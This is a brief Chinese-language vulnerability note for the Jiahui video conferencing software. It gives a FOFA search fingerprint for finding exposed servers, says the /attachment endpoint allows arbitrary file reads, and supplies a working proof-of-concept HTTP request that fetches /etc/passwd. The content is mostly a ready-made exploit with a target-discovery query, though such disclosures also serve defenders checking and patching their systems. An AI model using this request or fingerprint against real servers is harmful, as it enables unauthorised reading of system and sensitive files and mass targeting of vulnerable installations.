**fofa**

body="/nice2meet/m-download.html"

**一、漏洞简述**

佳会视频会议软件，旨在为企业和团队提供高效、便捷的远程会议解决方案。通过该软件，用户可以随时随地参与会议，支持多人同时在线交流，提升沟通效率。其接口/attachment存在任意文件读取漏洞，攻击者可通过该漏洞获取服务器敏感信息。

**二、漏洞检测poc**



```

GET /attachment?file=/etc/passwd HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Connection: close
```